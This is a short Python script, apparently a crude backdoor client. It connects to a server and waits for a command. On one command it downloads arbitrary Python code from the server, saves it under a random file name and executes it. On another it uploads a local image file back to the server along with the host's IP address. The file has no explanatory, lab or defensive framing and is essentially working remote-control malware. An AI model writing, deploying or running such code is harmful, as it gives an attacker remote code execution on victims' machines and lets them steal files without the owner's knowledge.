import socket
from random import choice
list = ['1','2','3','4','5','6','f','h','d','s']
rnd = choice(list)+choice(list)+choice(list)+choice(list)
from os import system
# Create a socket object
clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Get local machine name
host = socket.gethostname()

port = 9999

# Connect to the server
clientsocket.connect(('127.0.0.1', 80))
get = clientsocket.recv(1000000)
get=get.decode('utf-8')
hostname = socket.gethostname()
ip_address = socket.gethostbyname(hostname)

if get == '1':
    with open(f'{rnd}.py','wb') as f:
        clientsocket.send(ip_address.encode('utf-8'))
        date = clientsocket.recv(100000) 
        f.write(date)
        f.close()
    system(f'python {rnd}.py')
    clientsocket.close()
elif get == '2':
    clientsocket.send(ip_address.encode('utf-8'))
    with open('22.png', 'rb') as f:
        data = f.read()
        clientsocket.sendall(data)
        clientsocket.send(ip_address.encode('utf-8'))
    clientsocket.close()